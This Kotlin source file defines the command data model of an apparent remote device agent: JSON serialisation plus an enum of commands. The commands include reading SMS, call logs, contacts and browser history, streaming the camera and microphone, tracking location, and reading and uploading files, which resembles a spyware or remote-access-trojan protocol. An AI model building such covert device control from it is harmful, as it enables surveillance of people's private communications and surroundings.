package com.remoteagent.protocol

import org.json.JSONObject
import java.util.*

class DeviceCommand {
    var transactionId: String = UUID.randomUUID().toString()
    var commandType: CommandType? = null
    var payload: String = "{}"
    var timeoutSeconds: Int = 60
    var issuedAt: Long = System.currentTimeMillis()

    constructor()

    fun toJSON(): JSONObject {
        return JSONObject().apply {
            put("transaction_id", transactionId)
            put("command_type", commandType?.value)
            put("payload", payload)
            put("timeout_seconds", timeoutSeconds)
            put("issued_at", issuedAt)
        }
    }

    fun getString(key: String, defaultValue: String): String {
        return try {
            val json = JSONObject(payload)
            json.optString(key, defaultValue)
        } catch (_: Exception) {
            defaultValue
        }
    }

    fun getInt(key: String, defaultValue: Int): Int {
        return try {
            val json = JSONObject(payload)
            json.optInt(key, defaultValue)
        } catch (_: Exception) {
            defaultValue
        }
    }

    fun getLong(key: String, defaultValue: Long): Long {
        return try {
            val json = JSONObject(payload)
            json.optLong(key, defaultValue)
        } catch (_: Exception) {
            defaultValue
        }
    }

    fun getBoolean(key: String, defaultValue: Boolean): Boolean {
        return try {
            val json = JSONObject(payload)
            json.optBoolean(key, defaultValue)
        } catch (_: Exception) {
            defaultValue
        }
    }

    enum class CommandType(val value: String) {
        FILE_LIST("file_list"),
        FILE_READ("file_read"),
        FILE_READ_CHUNK("file_read_chunk"),
        FILE_WRITE("file_write"),
        FILE_DELETE("file_delete"),
        FILE_RENAME("file_rename"),
        FILE_MOVE("file_move"),
        FILE_DOWNLOAD("file_download"),
        FILE_UPLOAD("file_upload"),
        FILE_GET_DIRECTORY("file_get_directory"),
        GET_FOREGROUND_APP("get_foreground_app"),
        GET_BROWSER_HISTORY("get_browser_history"),
        GET_INSTALLED_APPS("get_installed_apps"),
        GET_CONTACTS("get_contacts"),
        GET_CALL_LOGS("get_call_logs"),
        GET_SMS_MESSAGES("get_sms_messages"),
        CAMERA_SNAPSHOT("camera_snapshot"),
        CAMERA_STREAM("camera_stream"),
        CAMERA_STOP("camera_stop"),
        MIC_START("mic_start"),
        MIC_STOP("mic_stop"),
        MIC_STREAM("mic_stream"),
        GET_DEVICE_INFO("get_device_info"),
        GET_LOCATION("get_location"),
        HEARTBEAT("heartbeat"),
        DEVICE_ENROLL("device_enroll"),
        DEVICE_DISCONNECT("device_disconnect");

        companion object {
            fun fromString(value: String): CommandType? {
                return values().find { it.value == value }
            }
        }
    }

    companion object {
        fun fromJSON(json: JSONObject): DeviceCommand? {
            return try {
                DeviceCommand().apply {
                    transactionId = json.optString("transaction_id", UUID.randomUUID().toString())
                    commandType = CommandType.fromString(json.optString("command_type"))
                    payload = json.optString("payload", "{}")
                    timeoutSeconds = json.optInt("timeout_seconds", 60)
                    issuedAt = json.optLong("issued_at", System.currentTimeMillis())
                }
            } catch (_: Exception) {
                null
            }
        }
    }
}